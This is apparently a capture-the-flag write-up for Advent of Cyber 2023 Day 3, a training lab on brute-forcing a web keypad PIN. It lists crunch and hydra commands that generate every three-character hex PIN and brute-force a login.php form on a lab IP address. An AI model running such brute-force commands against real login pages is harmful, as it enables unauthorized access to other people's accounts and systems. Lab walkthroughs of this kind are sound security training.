# AoC 2023 - Day 3

> `Brute-forcing` Hydra is Coming to Town

## Learning Objectives
> - Password complexity and the number of possible combinations
> - How the number of possible combinations affects the feasibility of brute force attacks
> - Generating password combinations using `crunch`
> - Trying out passwords automatically using `hydra`

## Steps

```bash
└─$ export box=10.10.94.68
└─$ firefox $box:8000
```

The keypad has keys for 0-9 and A-F, lets generate a list.

```bash
└─$ crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

Using the network tab of the developer inspector inside firefox I can see what the request to the web-server looks like when trying to enter a pin.

```bash
POST http://10.10.94.68:8000/login.php

└─$ hydra -l '' -P 3digits.txt -f -v 10.10.94.68 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
[8000][http-post-form] host: 10.10.94.68   password: {REDACTED}
```

## Question 1

> Using `crunch` and `hydra`, find the PIN code to access the control system and unlock the door. What is the flag?

Click unlock door and get the flag.

